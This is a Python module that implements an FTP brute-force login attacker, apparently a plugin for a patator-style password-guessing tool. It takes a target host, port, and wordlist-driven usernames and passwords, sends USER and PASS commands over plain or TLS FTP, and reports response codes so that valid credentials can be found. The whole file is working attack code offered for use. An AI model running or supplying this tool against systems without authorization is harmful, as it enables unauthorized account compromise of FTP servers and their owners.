
from colorama import Style, Fore
from ftplib import FTP, Error as FTP_Error
try:
  from ftplib import FTP_TLS
except ImportError:
  notfound.append('python')

__author__="tinyb0y"
__email__ = Fore.RED + "tinyb0y@protonmail.com"

from src.rfunctions import *
from src.custlogger import *


class FTP_login(TCP_Cache):
  '''Brute-force FTP'''

  usage_hints = (
    '''%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt'''
    ''' -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500''',
    )

  available_options = (
    ('host', 'target host'),
    ('port', 'target port [21]'),
    ('user', 'usernames to test'),
    ('password', 'passwords to test'),
    ('tls', 'use TLS [0|1]'),
    ('timeout', 'seconds to wait for a response [10]'),
    )
  available_options += TCP_Cache.available_options

  Response = Response_Base

  def connect(self, host, port, tls, timeout):

    if tls == '0':
      fp = FTP(timeout=int(timeout))
    else:
      fp = FTP_TLS(timeout=int(timeout))

    banner = fp.connect(host, int(port))

    if tls != '0':
      fp.auth()

    return TCP_Connection(fp, banner)

  def execute(self, host, port='21', tls='0', user=None, password=None, timeout='10', persistent='1'):
    logger = logging.getLogger(__name__)
    try:
      with Timing() as timing:
        fp, resp = self.bind(host, port, tls, timeout=timeout)

      if user is not None or password is not None:
        with Timing() as timing:

          if user is not None:
            resp = fp.sendcmd('USER ' + user)

          if password is not None:
            resp = fp.sendcmd('PASS ' + password)

      logger.debug('No error: %r' % resp)
      self.reset()

    except FTP_Error as e:
      logger.debug('FTP_Error: %s' % e)
      resp = str(e)

    if persistent == '0':
      self.reset()

    code, mesg = resp.split(' ', 1)
    return self.Response(code, mesg, timing)


